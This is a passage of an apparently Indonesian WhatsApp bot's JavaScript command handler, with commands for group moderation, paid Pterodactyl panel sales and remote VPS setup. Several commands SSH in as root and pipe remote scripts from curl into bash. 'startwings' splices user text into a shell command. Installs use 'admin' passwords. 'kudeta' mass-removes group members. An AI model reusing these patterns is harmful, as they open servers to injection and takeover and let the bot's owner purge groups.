      videoCaption += `乂 *Published Time* : ${video.publishedTime}\n`;
      videoCaption += `乂 *View Count* : ${video.viewCount}\n`;
      videoCaption += `乂 *Duration* : ${video.duration}\n`;
      videoCaption += `乂 *Video Url* : ${video.videoUrl}\n\n`;
      
      await conn.sendMessage(m.chat, { image: { url: video.thumbnail }, caption: videoCaption });
      await conn.sendMessage(m.chat, { video: { url: video.videoUrl }, caption: `Here's your video!` });
    }
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Danz Starting 🔥")
for (let i of memberFilter) {
await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

case "prosess": case "prosesbwang": {
      var loadingz = [
        "wet ku cek dlu",
        "dah ada notif",
        "masuk",
        "prosess",     
      ];
      let { key } = await conn.sendMessage(m.chat, {
        text: "proses",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await conn.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
break

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *⳺ ID :* ${get.data.result.idtransaksi}
 *⳺ Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *⳺ Barang :* Panel Pterodactyl
 *⳺ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *⳺ ID :* ${db.users[m.sender].saweria.idDeposit}
 *⳺ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *⳺ Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *⳺ ID :* ${get.data.result.idtransaksi}
 *⳺ Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *⳺ Barang :* Admin Panel Pterodactyl
 *⳺ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *⳺ ID :* ${db.users[m.sender].saweria.idDeposit}
 *⳺ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *⳺ Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "ytm": case "yatim": {
      var loadingz = [
        "kasian ada yatim",
        "tidur di tanah 😱",
        "tidur di kasur cok",
        "beli bapak di shopee murah",     
      ];
      let { key } = await conn.sendMessage(m.chat, {
        text: "woy yatim 😂",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await conn.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
break

case "cekagama": {
if (!text) return m.reply(example("nama"))
let who = m.mentionedJid[0] 
? m.mentionedJid[0] 
: m.quoted 
? m.quoted.sender 
: m.sender;
let khodamList = [
    "*Agama : Islam*",
    "*Agama : Kristen*",
    "*Agama : Atheis*",
    "*Agama : Budha*",
    "*Agama : Hindu*",
